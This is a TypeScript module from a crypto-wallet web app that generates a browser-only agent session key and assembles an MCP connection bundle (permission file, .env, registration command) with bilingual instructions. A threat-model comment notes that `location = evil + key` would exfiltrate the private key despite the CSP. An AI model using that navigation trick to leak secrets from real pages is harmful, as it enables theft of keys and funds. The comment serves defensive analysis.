import {getAddress, type Address, type Hex} from "viem";
import {generatePrivateKey, privateKeyToAccount} from "viem/accounts";
import {giwaSepolia} from "@mapae/shared";
import type {Locale} from "./i18n";

/**
 * An agent session key born in this browser tab.
 *
 * This is deliberately not custody. The key is generated locally, never sent
 * anywhere, never written to browser storage, and leaves the page only through
 * an explicit copy the user performs. Its blast radius is also not the wallet's:
 * the only authority this key ever receives is the delegation the owner signs,
 * and that authority is bounded by the on-chain caveats — period cap, expiry,
 * recipient policy.
 *
 * "Never written to browser storage" is now an invariant something else has to
 * hold, not just a property of this file: `grant-store.ts` persists the grant
 * list, and its projection is an allowlist that omits this type. A test there
 * asserts a known private key never reaches the serialized document.
 *
 * An earlier version of this comment credited the CSP's `connect-src` with
 * closing "every other egress". It does not. That directive governs
 * fetch/XHR/WebSocket/sendBeacon; nothing in the policy restricts top-level
 * navigation, and no browser ships `navigate-to`, so `location = evil + key`
 * would exfiltrate regardless. `img-src 'self'` and `form-action 'none'` do
 * close the beacon and form routes. The guarantee is narrower than it read, and
 * it was the sentence justifying how this key is handled.
 */
export interface AgentSessionKey {
    address: Address;
    privateKey: Hex;
}

export function generateAgentSessionKey(): AgentSessionKey {
    const privateKey = generatePrivateKey();
    return {privateKey, address: getAddress(privateKeyToAccount(privateKey).address)};
}

export interface McpBundle {
    permissionFileText: string;
    envFileText: string;
    mcpCommand: string;
    bundleText: string;
}

const HOSTED_SELLER_URL = "https://seller.mapae.io";
const HOSTED_FACILITATOR_URL = "https://facilitator.mapae.io";

/*
 * The human-readable lines of the generated bundle. Generated text is user-facing
 * copy like any rendered string, so it follows the same bilingual rule: English is
 * the base, Korean is the toggle, and the map stays local to the module that emits
 * it. Paths, env values, and command syntax are not copy and stay out of the map —
 * only the repo-path placeholder inside the command is language.
 */
const BUNDLE_COPY: Record<
    Locale,
    {
        title: string;
        provenance: string;
        secretLine1: string;
        secretLine2: string;
        step0: string;
        step1: string;
        step2: string;
        step3: string;
        repoPathPlaceholder: string;
    }
> = {
    en: {
        title: "# Mapae MCP connection bundle",
        provenance:
            "# This text was generated in this browser only and is stored nowhere else.",
        secretLine1:
            "# AGENT_PRIVATE_KEY is a secret — move it into the file, then discard this text,",
        secretLine2:
            "# and if you use clipboard history or cross-device clipboard sync, clear those too.",
        step0: "## 0) Prepare the repository (after installing Bun)",
        step1: "## 1) Save the following as apps/delegated-agent/open-agent.permission.json",
        step2: "## 2) Save the following as apps/delegated-agent/.env",
        step3: "## 3) Register the MCP client — replace the path with your actual clone location",
        repoPathPlaceholder: "<path to the Mapae repository>",
    },
    ko: {
        title: "# Mapae MCP 연결 번들",
        provenance: "# 이 내용은 이 브라우저에서만 만들어졌으며 어디에도 저장되어 있지 않습니다.",
        secretLine1: "# AGENT_PRIVATE_KEY는 비밀값입니다 — 파일로 옮긴 뒤 이 텍스트는 폐기하고,",
        secretLine2: "# 클립보드 기록·기기 간 클립보드 동기화를 쓴다면 그 기록도 지우세요.",
        step0: "## 0) 저장소 준비 (Bun 설치 후)",
        step1: "## 1) 아래 내용을 apps/delegated-agent/open-agent.permission.json 으로 저장",
        step2: "## 2) 아래 내용을 apps/delegated-agent/.env 로 저장",
        step3: "## 3) MCP 클라이언트 등록 — 경로를 실제 클론 위치로 바꾸세요",
        repoPathPlaceholder: "<Mapae 저장소 경로>",
    },
};

/**
 * Everything the MCP setup needs, assembled where all three inputs already are.
 *
 * The three artifacts (permission file, `.env`, registration command) were
 * previously scattered across the clipboard, an `.env.example` with a
 * placeholder admin, and a guide section — and the step joining them (wrap the
 * copied hex in `{"permissionContext": …}`) was written down nowhere. The
 * browser is the one place that simultaneously holds the signed permission, the
 * generated session key, and the committed deployment artifact with the real
 * Framework admin, so it emits the finished set instead of pieces.
 */
export function buildMcpBundle(
    params: {
        permissionContext: Hex;
        agentKey: AgentSessionKey;
        frameworkAdmin: Address;
    },
    locale: Locale = "en",
): McpBundle {
    const t = BUNDLE_COPY[locale];
    const permissionFileText = `${JSON.stringify(
        {permissionContext: params.permissionContext},
        null,
        4,
    )}\n`;

    const envFileText = [
        `AGENT_PRIVATE_KEY=${params.agentKey.privateKey}`,
        `FRAMEWORK_ADMIN_ADDRESS=${getAddress(params.frameworkAdmin)}`,
        `SELLER_URL=${HOSTED_SELLER_URL}`,
        `FACILITATOR_URL=${HOSTED_FACILITATOR_URL}`,
        `GIWA_SEPOLIA_RPC_URL=${giwaSepolia.rpcUrls.default.http[0]}`,
        "DELEGATION_DEPLOYMENT_PATH=../../deployments/giwa-sepolia.framework.json",
        "DELEGATION_MANIFEST_PATH=../../deployments/giwa-sepolia.framework-manifest.json",
        "PARENT_PERMISSION_CONTEXT_PATH=./open-agent.permission.json",
        "",
    ].join("\n");

    const mcpCommand =
        "claude mcp add mapae -- sh -c " +
        `'cd ${t.repoPathPlaceholder}/apps/delegated-agent && exec bun ../agent-mcp/index.ts'`;

    const bundleText = [
        t.title,
        t.provenance,
        t.secretLine1,
        t.secretLine2,
        "",
        t.step0,
        "git clone --recurse-submodules https://github.com/kooroot/Mapae.git",
        "cd Mapae && bun install --frozen-lockfile",
        "",
        t.step1,
        permissionFileText.trimEnd(),
        "",
        t.step2,
        envFileText.trimEnd(),
        "",
        t.step3,
        mcpCommand,
        "",
    ].join("\n");

    return {permissionFileText, envFileText, mcpCommand, bundleText};
}
